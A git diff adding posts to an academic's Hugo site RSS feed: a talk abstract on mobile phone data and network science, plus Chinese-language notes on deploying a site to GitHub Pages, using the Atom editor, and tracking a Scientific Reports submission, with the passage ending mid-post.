@@ -11,6 +11,26 @@
     <atom:link href="/index.xml" rel="self" type="application/rss+xml" />
     
     <item>
+      <title>Analyzing Mobile Phone Data With Network Science</title>
+      <link>https://chengjun.github.io/note/2016-10-18-ica2017talk/</link>
+      <pubDate>Sun, 14 May 2017 00:00:00 +0000</pubDate>
+      
+      <guid>https://chengjun.github.io/note/2016-10-18-ica2017talk/</guid>
+      <description>
+
+&lt;h3 id=&#34;abstract-150-200-word&#34;&gt;Abstract (150-200 word)&lt;/h3&gt;
+
+&lt;p&gt;With the widespread use of mobile computing devices in contemporary society, our trajectories in the physical space and virtual world are increasingly closely connected. Using the anonymous smartphone data, we can construct the communication network, mobility network, and attention network, and further analyze the data in the perspective of network science.&lt;/p&gt;
+
+&lt;h3 id=&#34;short-bio&#34;&gt;short-bio&lt;/h3&gt;
+
+&lt;p&gt;Cheng-Jun Wang, Ph.D. He is currently an assistant research fellow in the School of Journalism and Communication, Nanjing University. He is also the director of Ogilvy Data Science Lab, Computational Communication Collaboratory. His research on computational communication appears in both SSCI and SCI indexed journals, such as Scientific Reports, PloS ONE, Physica A, Cyberpsychology, and Journal of Social and Personal Relationships.&lt;/p&gt;
+
+&lt;h3 id=&#34;20-25-minutes&#34;&gt;20-25 minutes&lt;/h3&gt;
+</description>
+    </item>
+    
+    <item>
       <title>The Origin, Concept, and Applications of Computational Communication</title>
       <link>https://chengjun.github.io/talk/pku-shenzhen-talk/</link>
       <pubDate>Sun, 01 Jan 2017 00:00:00 +0000</pubDate>
@@ -39,6 +59,521 @@
       
       <guid>https://chengjun.github.io/publication/collective-direction/</guid>
       <description>&lt;p&gt;More detail can easily be written here using &lt;em&gt;Markdown&lt;/em&gt; and $\rm \LaTeX$ math code.&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>Github个人网站维护</title>
+      <link>https://chengjun.github.io/note/2016-08-03-github/</link>
+      <pubDate>Wed, 03 Aug 2016 00:00:00 +0000</pubDate>
+      
+      <guid>https://chengjun.github.io/note/2016-08-03-github/</guid>
+      <description>
+
+&lt;h2 id=&#34;hugo-on-github&#34;&gt;Hugo on github&lt;/h2&gt;
+
+&lt;ul&gt;
+&lt;li&gt;Create on GitHub &lt;code&gt;mywebsite-hugo&lt;/code&gt; repository (it will host Hugo’s content)&lt;/li&gt;
+&lt;li&gt;Create on GitHub &lt;code&gt;chengjun.github.io&lt;/code&gt; repository (it will host the public folder: the static website)&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;cd github&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;git clone https://github.com/chengjun/mywebsite-hugo.git&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;hugo new site mywebsite-hugo --force&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;cd mywebsite-hugo&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;download &lt;a href=&#34;https://github.com/gcushen/hugo-academic/archive/master.zip&#34; target=&#34;_blank&#34;&gt;Academic&lt;/a&gt; and extract it into a themes/academic folder within your Hugo website.&lt;/li&gt;
+&lt;li&gt;If you are creating a new website, copy the contents of the exampleSite folder to your website root folder, overwriting existing files if necessary.&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;hugo server --watch&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Once you are happy with the results, &lt;code&gt;Ctrl+C&lt;/code&gt; (kill server) and &lt;code&gt;rm -rf public&lt;/code&gt; (don’t worry, it can always be regenerated with hugo -t &lt;yourtheme&gt;)&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;git submodule add https://github.com/chengjun/chengjun.github.io.git public --force&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Almost done: add a deploy.sh script to help you&lt;/li&gt;
+&lt;li&gt;and make it executable: &lt;code&gt;chmod +x deploy.sh&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;./deploy.sh &amp;quot;Your optional commit message&amp;quot;&lt;/code&gt; to send changes to &lt;username&gt;.github.io (careful, you may also want to commit changes on the &lt;your-project&gt;-hugo repo).&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;#!/bin/bash
+
+echo -e &amp;quot;\033[0;32mDeploying updates to GitHub...\033[0m&amp;quot;
+
+# Build the project.
+hugo # if using a theme, replace by `hugo -t &amp;lt;yourtheme&amp;gt;`
+
+# Go To Public folder
+cd public
+# Add changes to git.
+git add -A
+
+# Commit changes.
+msg=&amp;quot;rebuilding site `date`&amp;quot;
+if [ $# -eq 1 ]
+  then msg=&amp;quot;$1&amp;quot;
+fi
+git commit -m &amp;quot;$msg&amp;quot;
+
+# Push source and build repos.
+git push origin master
+
+# Come Back
+cd ..
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;domain-name&#34;&gt;domain name&lt;/h2&gt;
+
+&lt;p&gt;在godaddy上花了122块钱买了两年的域名 &lt;a href=&#34;http://chengjunwang.com&#34; target=&#34;_blank&#34;&gt;chengjunwang.com&lt;/a&gt;。简单设置cname和goddy上的a record和cname www record就好了。主要参考了&lt;a href=&#34;http://andrewsturges.com/blog/jekyll/tutorial/2014/11/06/github-and-godaddy.html&#34; target=&#34;_blank&#34;&gt;这里&lt;/a&gt;。&lt;/p&gt;
+
+&lt;p&gt;我对于html的无知可以说是到了某种无以附加的程度。虽然我投入了很多时间，但往往都是干中学。而不是系统的模仿。通常会发现很多困惑，然后每次对我而言都是一个个小trick就解决了问题。&lt;/p&gt;
+
+&lt;h2 id=&#34;平行的文本框&#34;&gt;平行的文本框&lt;/h2&gt;
+
+&lt;p&gt;如何添加一个平行的文本框？这个困惑了我很久的问题，解决方法是设置position为absolute。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;#textbox {
+  position:absolute;
+  top: 200px;
+  width: auto;
+  margin-left: 50px;
+  background-color: rgba(0,0,0,0.2);
+  opacity:1;
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;修改之后又觉得不好看。又尝试了iframe，也不是很合适。&lt;/p&gt;
+
+&lt;p&gt;之后发现一篇好文章&lt;a href=&#34;http://css-tricks.com/examples/ShapesOfCSS/&#34; target=&#34;_blank&#34;&gt;The Shapes of CSS&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;修改了其中的talkbubble，放在application.css中。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;#talkbubble {
+   position:absolute;
+   top: 250px;
+   margin-left: 50px;
+   width: 300px;
+   height: 150px;
+   background-color: rgba(0,0,0,0.2);
+   -moz-border-radius:    10px;
+   -webkit-border-radius: 10px;
+   border-radius:         10px;
+}
+#talkbubble:before {
+   content:&amp;quot;&amp;quot;;
+   position: absolute;
+   margin-left: 300px;
+   top: 80px;
+   width: 0;
+   height: 0;
+   background-color: transparent;
+   #border-top: 5px solid transparent;
+   border-bottom: 30px solid rgba(0,0,0,0.2);
+   border-right: 120px solid transparent;
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;在index.html里加入talkbubble来显示新闻。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;&amp;lt;div id=&amp;quot;talkbubble&amp;quot;&amp;gt;
+  &amp;lt;h2&amp;gt;&amp;lt;a href=&amp;quot;http://chengjun.github.io/cv/news.html&amp;quot;&amp;gt;News&amp;lt;/a&amp;gt;&amp;lt;/h2&amp;gt;
+  &amp;lt;p&amp;gt;[Feb 23] &amp;lt;a href=&amp;quot;https://pypi.python.org/pypi/scholarNetwork/&amp;quot;&amp;gt;scholarNetwork&amp;lt;/a&amp;gt;--a python package which can help crawl and visualize the coauthor network of Google Scholar is released to Pypi. &amp;lt;/p&amp;gt;
+&amp;lt;/div&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h3 id=&#34;谷歌字体&#34;&gt;谷歌字体&lt;/h3&gt;
+
+&lt;p&gt;俺天朝跟谷歌成了死敌。背后的很多想法让人很无奈。虽然米果是两党制，但是谷歌据说也在检查之列。到了俺朝，美利坚放不下身段了，天朝也放不下，于是就僵住了。于是很多谷歌的服务都不好用了。比如谷歌学术，谷歌邮箱。哎妈呀，老伤心老。我这里要说的却是谷歌的字体格式。&lt;/p&gt;
+
+&lt;p&gt;在天朝载入我的博客慢的原因就是因为style.css里（media/css/style.css）调用里谷歌字体。好伤心，每次访问速度都很慢，非得翻墙才行。可是不能让俺的读者们也翻墙吧，这也太虎了。反正我的审美要求也没那么高。雪藏了吧。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;#@import url(http://fonts.googleapis.com/css?family=Galdeano);
+#@import url(http://fonts.googleapis.com/css?family=Electrolize);
+#@import url(http://fonts.googleapis.com/css?family=Cuprum);
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h3 id=&#34;改过来之后&#34;&gt;改过来之后&lt;/h3&gt;
+
+&lt;p&gt;我了个去，怎么英文字体变这么大了，BIG好吧，只能骗自己感觉萌萌哒啦。&lt;/p&gt;
+
+&lt;h3 id=&#34;把谷歌字体放在本站&#34;&gt;把谷歌字体放在本站&lt;/h3&gt;
+
+&lt;p&gt;其实很早就注意到andy wang的这个解决方法，一直比较懒。还是去在mac上安装了github for mac，于是把andy wang的media文件夹偷到我这里来用。&lt;/p&gt;
+
+&lt;p&gt;Andy Wang:
+&lt;code&gt;你好，我扒走了你的模板，然后在天朝用发现非常慢，然后调试了一下，发现是在style.css和home.css里面有从别的网站下载字体文件的, http://fonts.googleapis.com/这个网站在天朝访问非常不稳定，所以做了一些小改动，把字体文件都下载到网站上了，页面渲染速度也快了很多。https://github.com/synckey/synckey.github.io/tree/master/media/css&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;终于，世界再次变得一片清凉了。真好。&lt;/p&gt;
+
+&lt;h2 id=&#34;categories&#34;&gt;categories&lt;/h2&gt;
+
+&lt;p&gt;我喜欢在网页端更新github上的日志，通过设置只显示categories为blog的文档，我可以每次修改一点东西就完全在网页端写日志。图片附件什么的可以放在七牛网站，感觉非常好。&lt;/p&gt;
+
+&lt;p&gt;下面是我用来复制和重命名1000个md文本的python代码：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;        # -*- coding: utf-8 -*-
+        &amp;quot;&amp;quot;&amp;quot;
+        Created on Thu Aug 07 14:05:09 2014
+
+        @author: chengjun
+        &amp;quot;&amp;quot;&amp;quot;
+
+        import shutil
+        path = &amp;quot;D:/github/chengjun.github.io/_posts/&amp;quot;   
+
+        demo = path + &amp;quot;2010-01-01-demo.md&amp;quot;
+
+        for i in range(1000):
+            newFile = path + &amp;quot;2010-01-&amp;quot; + str(i) + &amp;quot;.md&amp;quot;
+            print newFile
+            shutil.copy(demo, newFile)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://chengjun.qiniudn.com/7.jpg&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&#34;jekyll3-0&#34;&gt;jekyll3.0&lt;/h2&gt;
+
+&lt;p&gt;这个是一个测试，jekyll更新到了3.0版本，所以github也相应发生了改变（见&lt;a href=&#34;https://github.com/blog/2100-github-pages-now-faster-and-simpler-with-jekyll-3-0&#34; target=&#34;_blank&#34;&gt;这里&lt;/a&gt;）。这导致了我的文章无法显示，解决的方法是去掉表头的时间一行，就可以了，我还没有明白原因。&lt;/p&gt;
+
+&lt;h2 id=&#34;某一类的博文目录&#34;&gt;某一类的博文目录&lt;/h2&gt;
+
+&lt;p&gt;主要参考 &lt;a href=&#34;http://stackoverflow.com/questions/12008108/filtering-posts-using-categories-in-jekyll-bootstrap&#34; target=&#34;_blank&#34;&gt;filtering-posts-using-categories-in-jekyll-bootstrap&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;这个是使用liquid写的，介绍见&lt;a href=&#34;http://liquidmarkup.org/&#34; target=&#34;_blank&#34;&gt;这里&lt;/a&gt;。&lt;/p&gt;
+
+&lt;p&gt;主要添加两行liquid代码：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;if post.categories contains &#39;生活&#39;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;不要忘记endif&lt;/p&gt;
+
+&lt;p&gt;由于liquid语言本身不能在本网站呈现，读者可以查看&lt;a href=&#34;https://github.com/chengjun/chengjun.github.io/blob/master/life/index.html&#34; target=&#34;_blank&#34;&gt;这里&lt;/a&gt;。&lt;/p&gt;
+
+&lt;p&gt;琢磨出一个不用每次在jekyll上写博客都要上传的方法：将要显示的博客的categories设为blog，一次上传n个草稿（不指定categories），使用liquid语言指定在博客列表中只显示blog类的。这样草稿不会被显示，每次在线登录github，更改一个草稿的标题和categories就可以了。图片用外链flickr。&lt;/p&gt;
+
+&lt;h2 id=&#34;paginator&#34;&gt;paginator&lt;/h2&gt;
+
+&lt;p&gt;今天下午鼓捣了半天jekyll的设置，最初是想弄一个&lt;a href=&#34;http://jekyllrb.com/docs/pagination/&#34; target=&#34;_blank&#34;&gt;paginator&lt;/a&gt;给文章列表分页，结果搞了半天，没搞定。各种问题。&lt;a href=&#34;http://patrick-mckinley.com/tech/jekyll-pagination.html&#34; target=&#34;_blank&#34;&gt;Patrick McKinley&lt;/a&gt;说是因为不是网站第一层的index.html，所以jekyll官方设置时没有用的。于是，直接用他的方法，发现没有办法在我的网站上实现。&lt;/p&gt;
+
+&lt;p&gt;Patrick McKinley的博客以图片来显示博客文章的方法似乎很酷。感兴趣，去研究了下他的&lt;a href=&#34;https://github.com/lilmuckers/lilmuckers.github.com&#34; target=&#34;_blank&#34;&gt;代码&lt;/a&gt;，大致是设置了post.image，图片存放在assets中的图片文件夹。我弄了下，也没弄成功。&lt;/p&gt;
+
+&lt;p&gt;又看到&lt;a href=&#34;tmtxt.github.com&#34; target=&#34;_blank&#34;&gt;Mr Trường at RMIT&lt;/a&gt;的网页，翻了半天，加了related_posts功能。&lt;/p&gt;
+
+&lt;p&gt;没想到晚上更惨，被python的encoding error搞得很头大！&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>测试Atom软件</title>
+      <link>https://chengjun.github.io/note/2016-05-04-atom/</link>
+      <pubDate>Wed, 04 May 2016 00:00:00 +0000</pubDate>
+      
+      <guid>https://chengjun.github.io/note/2016-05-04-atom/</guid>
+      <description>
+
+&lt;p&gt;使用&lt;strong&gt;Atom&lt;/strong&gt;来编写markdown非常不错，按ctr+shift+m就可以进入预览模式，我想markdownpad可以抛弃掉了。这个软件更流畅，非常棒！因为我经常要写github的博客，使用atom时最容易的形式。减少了甚多负担，非常的自由，如果它具有上传功能就好了。&lt;/p&gt;
+
+&lt;h1 id=&#34;数学公式&#34;&gt;数学公式&lt;/h1&gt;
+
+&lt;p&gt;安装了markdown-preview-enhanced，可以很方便的展示数学公式，比如 $x = y^2$。&lt;/p&gt;
+
+&lt;p&gt;$E = MC^2$&lt;/p&gt;
+
+&lt;p&gt;需要按 ctrl+ shift+ x，按ctrl+ shift+ m无法展示数学公式。&lt;/p&gt;
+
+&lt;h1 id=&#34;参考文献&#34;&gt;参考文献&lt;/h1&gt;
+
+&lt;p&gt;插入一个参考文献&lt;sup class=&#34;footnote-ref&#34; id=&#34;fnref:a&#34;&gt;&lt;a rel=&#34;footnote&#34; href=&#34;#fn:a&#34;&gt;1&lt;/a&gt;&lt;/sup&gt;&lt;sup class=&#34;footnote-ref&#34; id=&#34;fnref:b&#34;&gt;&lt;a rel=&#34;footnote&#34; href=&#34;#fn:b&#34;&gt;2&lt;/a&gt;&lt;/sup&gt;&lt;sup class=&#34;footnote-ref&#34; id=&#34;fnref:c&#34;&gt;&lt;a rel=&#34;footnote&#34; href=&#34;#fn:c&#34;&gt;3&lt;/a&gt;&lt;/sup&gt;&lt;/p&gt;
+
+&lt;p&gt;再次插入一个参考文献&lt;sup class=&#34;footnote-ref&#34; id=&#34;fnref:b&#34;&gt;&lt;a rel=&#34;footnote&#34; href=&#34;#fn:b&#34;&gt;4&lt;/a&gt;&lt;/sup&gt;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;插入一个参考文献[^a][^b][^c]
+
+[^a]: author1, 2014, This is a title. Journal. 00-00
+[^b]: author2, 2014, This is a title. Journal. 00-00
+[^c]: author5, 2014, This is a title. Journal. 00-00
+
+再次插入一个参考文献[^b]
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h1 id=&#34;图片上传功能&#34;&gt;图片上传功能&lt;/h1&gt;
+
+&lt;p&gt;结果就发现阿里巴巴程序员knightli的两个atom插件：qiniu-uploader和markdown-assistant。设置好七牛的账号既可以非常方便地使用图床了。赞。&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://oaf2qt3yk.bkt.clouddn.com/1895b6670f7276a1f10903cf1305e686.png&#34; alt=&#34;qiniu-uploader&#34; /&gt;&lt;/p&gt;
+
+&lt;h1 id=&#34;git上传功能&#34;&gt;Git上传功能&lt;/h1&gt;
+
+&lt;p&gt;接着又找到了&lt;a href=&#34;https://atom.io/packages/git-plus&#34; target=&#34;_blank&#34;&gt;git-plus&lt;/a&gt;这个强大的插件，可以直接在atom里上传了。好吧！社区的力量真强大。太好了。&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;按 *command+shift+H*打开操作界面。&lt;/li&gt;
+&lt;li&gt;选择&lt;code&gt;add all commit+push&lt;/code&gt;就可以上传了！
+
+&lt;ul&gt;
+&lt;li&gt;填写commit的内容&lt;/li&gt;
+&lt;li&gt;command+s保存即可上传&lt;/li&gt;
+&lt;/ul&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://oaf2qt3yk.bkt.clouddn.com/7497f687c919c447882fd0abd4d68bc2.png&#34; alt=&#34;surprise&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;震惊脸！！！!&lt;/p&gt;
+
+&lt;h1 id=&#34;atom-html-preview&#34;&gt;atom-html-preview&lt;/h1&gt;
+
+&lt;p&gt;如果你需要修改的html文件的话，可以很方便地使用atom-html-preview插件。&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;快捷键&lt;code&gt;ctr+shift+h&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://oaf2qt3yk.bkt.clouddn.com/d832f904c15079ed7f38816a5407c1b6.png&#34; alt=&#34;atom-html-preview&#34; /&gt;&lt;/p&gt;
+
+&lt;h1 id=&#34;参考文献-1&#34;&gt;参考文献&lt;/h1&gt;
+&lt;div class=&#34;footnotes&#34;&gt;
+
+&lt;hr /&gt;
+
+&lt;ol&gt;
+&lt;li id=&#34;fn:a&#34;&gt;author1, 2014, This is a title. Journal. 00-00
+ &lt;a class=&#34;footnote-return&#34; href=&#34;#fnref:a&#34;&gt;&lt;sup&gt;^&lt;/sup&gt;&lt;/a&gt;&lt;/li&gt;
+&lt;li id=&#34;fn:b&#34;&gt;author2, 2014, This is a title. Journal. 00-00
+ &lt;a class=&#34;footnote-return&#34; href=&#34;#fnref:b&#34;&gt;&lt;sup&gt;^&lt;/sup&gt;&lt;/a&gt;&lt;/li&gt;
+&lt;li id=&#34;fn:c&#34;&gt;author5, 2014, This is a title. Journal. 00-00
+ &lt;a class=&#34;footnote-return&#34; href=&#34;#fnref:c&#34;&gt;&lt;sup&gt;^&lt;/sup&gt;&lt;/a&gt;&lt;/li&gt;
+&lt;li id=&#34;fn:b&#34;&gt;author2, 2014, This is a title. Journal. 00-00
+ &lt;a class=&#34;footnote-return&#34; href=&#34;#fnref:b&#34;&gt;&lt;sup&gt;^&lt;/sup&gt;&lt;/a&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;/div&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>语言是一道门槛</title>
+      <link>https://chengjun.github.io/note/2016-05-04-sr-revising/</link>
+      <pubDate>Wed, 04 May 2016 00:00:00 +0000</pubDate>
+      
+      <guid>https://chengjun.github.io/note/2016-05-04-sr-revising/</guid>
+      <description>
+
+&lt;h2 id=&#34;billing&#34;&gt;Billing&lt;/h2&gt;
+
+&lt;p&gt;Bill to&lt;/p&gt;
+
+&lt;p&gt;Cheng-Jun Wang
+wangchengjun@nju.edu.cn
++8617751010496&lt;/p&gt;
+
+&lt;h3 id=&#34;billing-method&#34;&gt;Billing method&lt;/h3&gt;
+
+&lt;p&gt;Invoice
+Billing address&lt;/p&gt;
+
+&lt;p&gt;Nanjing University
+22 Hankou Road, Gulou District, Nanjing University
+A306 Feiyimin Building, School of Journalism and Communication
+Nanjing
+China
+China
+210093&lt;/p&gt;
+
+&lt;h3 id=&#34;scientific-reports-出版业的一个新时代&#34;&gt;Scientific Reports —出版业的一个新时代&lt;/h3&gt;
+
+&lt;p&gt;Scientific Reports 是来自 Nature 杂志出版者的一个发表原始研究工作的刊物，在线出版，公开访问，内容涉及自然科学所有领域。托管在 nature.com（该网站是由Springer Nature出版的80多种刊物的共同门户，每月全球有数百万科学家访问）上， Scientific Reports 是任何人都可以公开访问的，发表在技术上可靠的、各领域内的专业人员感兴趣的原始研究论文，其相关内容的访问不受任何限制。&lt;/p&gt;
+
+&lt;p&gt;文章处理费自2015年1月起将按如下标准执行，以下费用包括增值税或其他当地税费。&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;£990 (UK &amp;amp; RoW)&lt;/li&gt;
+&lt;li&gt;$1,495 (The Americas)&lt;/li&gt;
+&lt;li&gt;€1,165 (Europe)&lt;/li&gt;
+&lt;li&gt;¥170,000 (Japan)&lt;/li&gt;
+&lt;li&gt;¥9,900 (China)&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Scientific Reports 是：&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;快速的（Fast）—迅速审稿和发表&lt;/li&gt;
+&lt;li&gt;严格的（Rigorous）—由学术界至少一个成员来进行同行评审&lt;/li&gt;
+&lt;li&gt;公开的（Open）—文章对所有人都是免费的，作者保留版权&lt;/li&gt;
+&lt;li&gt;可见的（Visible）—增强的浏览和搜索功能，确保您的文章能够被注意到&lt;/li&gt;
+&lt;li&gt;互联的（Interlinked）—与整个 nature.com 网站上的相关文章相互之间建立链接&lt;/li&gt;
+&lt;li&gt;全球的（Global）— 托管在 nature.com 上，全球媒体覆盖&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;根据&lt;a href=&#34;http://www.docin.com/p-1309834502.html&#34; target=&#34;_blank&#34;&gt;南京大学超一流、学科群一流、SCI A 区和 B 区期刊目录&lt;/a&gt;，Scientific reports属于SCI索引期刊的A区。2016年公布的Scientific Reports 影响因子5.228*
+*2015 Journal Citation Reports® Science Edition (Thomson Reuters, 2016)&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://oaf2qt3yk.bkt.clouddn.com/5e1e31a8ec89e5fa3374b23baa8eadde.png&#34; alt=&#34;SR&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;南京大学关于Scientific Reports论文发表的新闻：
+&lt;a href=&#34;http://news.nju.edu.cn/searchsite.php?r=scientific%20reports&#34; target=&#34;_blank&#34;&gt;http://news.nju.edu.cn/searchsite.php?r=scientific%20reports&lt;/a&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;2015-11-26 Scientific Reports刊登我校博士生俞恂大陆火山成因研究新成果&lt;/li&gt;
+&lt;li&gt;2014-10-29 大气科学学院符淙斌院士团队在Scientific Reports杂志发表最新研究成果&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&#34;8月19日&#34;&gt;8月19日&lt;/h2&gt;
+
+&lt;h3 id=&#34;hidden-direction&#34;&gt;hidden direction&lt;/h3&gt;
+
+&lt;p&gt;中间因为editor换了，又更新过一次reviewer，耽搁了时间。2015年12月10日进入decision started的状态；过了一个半月，也就是2016年1月24日到了2月2日才收到editor回复，之后又过了&lt;strong&gt;十天&lt;/strong&gt;时间收到SR的邮件。所以概括一下：这个editor的速度灰常慢，再等半个月。&lt;/p&gt;
+
+&lt;p&gt;突然发现9月2日editor提交了审稿意见，经过了一个多月终于Manuscript Submitted。一般而言进入此环节表示editor做好了决定，Finger crossed！耐心地等待下一周吧。9月5日，文章被接收。&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;Manuscript Submitted&lt;/strong&gt;  2nd September 16&lt;br /&gt;&lt;/li&gt;
+&lt;li&gt;Decision Started  26th July 16&lt;br /&gt;&lt;/li&gt;
+&lt;li&gt;Manuscript assigned to peer-reviewer/s    26th July 16&lt;br /&gt;&lt;/li&gt;
+&lt;li&gt;Manuscript Assigned to Peer-Reviewer/s    14th June 16&lt;br /&gt;&lt;/li&gt;
+&lt;li&gt;Manuscript Assigned to Editor 11th June 16&lt;br /&gt;&lt;/li&gt;
+&lt;li&gt;Submission Not Complete   11th June 16&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;二审论文提交是在6月11日（中间隔了四个月），14日送审，到7月26日审完，发给编辑做决定。编辑似乎需要一个月才愿意给决定。到本月26日，编辑就消耗了一个月了，拭目以待。&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;Decision Started  26th July 16&lt;br /&gt;&lt;/li&gt;
+&lt;li&gt;Manuscript assigned to peer-reviewer/s    26th July 16&lt;br /&gt;&lt;/li&gt;
+&lt;li&gt;Manuscript Assigned to Peer-Reviewer/s    14th June 16&lt;br /&gt;&lt;/li&gt;
+&lt;li&gt;Manuscript Assigned to Editor 11th June 16&lt;br /&gt;
+Submission Not Complete 11th June 16&lt;/li&gt;
+&lt;li&gt;Manuscript Submitted  24th January 16&lt;br /&gt;&lt;/li&gt;
+&lt;li&gt;Decision Started  10th December 15&lt;br /&gt;&lt;/li&gt;
+&lt;li&gt;Manuscript assigned to peer-reviewer/s    10th December 15&lt;br /&gt;&lt;/li&gt;
+&lt;li&gt;Manuscript Assigned to Peer-Reviewer/s    17th November 15&lt;/li&gt;
+&lt;li&gt;Manuscript Assigned to Editor 30th September 15&lt;br /&gt;&lt;/li&gt;
+&lt;li&gt;Manuscript Submitted  29th September 15&lt;br /&gt;&lt;/li&gt;
+&lt;li&gt;Submission Not Complete   22nd September 15&lt;br /&gt;&lt;/li&gt;
+&lt;li&gt;Quality Check Started 9th September 15&lt;br /&gt;&lt;/li&gt;
+&lt;li&gt;Submission Not Complete   29th August 15&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&#34;tracing&#34;&gt;tracing&lt;/h3&gt;
+
+&lt;p&gt;二审8月5日提交修改版本，进入quality check环节，8月12日收到邮件说要修改格式，当晚修改完毕提交。quality check到8月18日，进入decision started环节。没有想到当天就进入了Manuscript Submitted环节。一般而言进入此环节表示editor做好了决定。果然，晚上十一点半收到了acceptance letter。&lt;/p&gt;
+
+&lt;p&gt;Current Stage:  Decision Started (1 days)&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;Manuscript Submitted&lt;/strong&gt;  18th August 16&lt;br /&gt;&lt;/li&gt;
+&lt;li&gt;Decision Started  18th August 16&lt;br /&gt;&lt;/li&gt;
+&lt;li&gt;Manuscript Assigned to Editor 5th August 16&lt;br /&gt;&lt;/li&gt;
+&lt;li&gt;Submission Not Complete   9th July 16&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Manuscript Submitted&lt;/strong&gt;  6th July 16&lt;br /&gt;&lt;/li&gt;
+&lt;li&gt;Decision Started  6th July 16&lt;br /&gt;&lt;/li&gt;
+&lt;li&gt;Manuscript Assigned to Editor 2nd June 16&lt;br /&gt;&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Manuscript Submitted&lt;/strong&gt;  2nd June 16&lt;br /&gt;&lt;/li&gt;
+&lt;li&gt;Quality Check Started 29th May 16&lt;br /&gt;&lt;/li&gt;
+&lt;li&gt;Submission Not Complete   24th May 16&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&#34;sr的latex模板&#34;&gt;SR的LaTeX模板&lt;/h2&gt;
+
+&lt;p&gt;8月12日，SR邮件说我的reference不合规范，发现只有严格按照overleaf上的模板才能生成，索性直接使用这个模板&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&#34;https://www.overleaf.com/5874225tbgnxc#/19389854/&#34; target=&#34;_blank&#34;&gt;https://www.overleaf.com/5874225tbgnxc#/19389854/&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;点击project，点击 download as zip即可下载。&lt;/p&gt;
+
+&lt;p&gt;因为不允许上传bib和cls文件，所以每次validation的时候还可以选择自己上传一个pdf。修改时只需要删除原来的tex文件，重新上传tex，并在validation的时候重新上传一个pdf即可。&lt;/p&gt;
+
+&lt;h2 id=&#34;积极向上的心智&#34;&gt;积极向上的心智&lt;/h2&gt;
+
+&lt;p&gt;突然我挺烦“正能量”这个词，因为使用这个词的地方往往是政府缺位的地方。&lt;/p&gt;
+
+&lt;p&gt;但是对于个体而言，找到正能量确实非常有必要的。每一个人都会面对生活的各种挑战，我们无法预测未来会是怎样，上天将会如何试探我们。&lt;/p&gt;
+
+&lt;p&gt;面对生活，积极向上的精神是不可或缺的。&lt;/p&gt;
+
+&lt;p&gt;这是一种心智的力量，需要个体去修炼。禅宗讲行走坐卧皆是修行是有道理的，因为每一个细节都在锤炼着我们的意志。我喜欢心智这个词，因为当我们面对挑战的时候，仅仅强调勇气、勤奋是远远不够的。因为我们可能是那个面对风车的堂吉诃德；因为我们可能已经在错误的道路上渐行渐远。要有智慧来面对挑战。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;不仅仅是蔑视困难，而且要能积极地应对挑战。
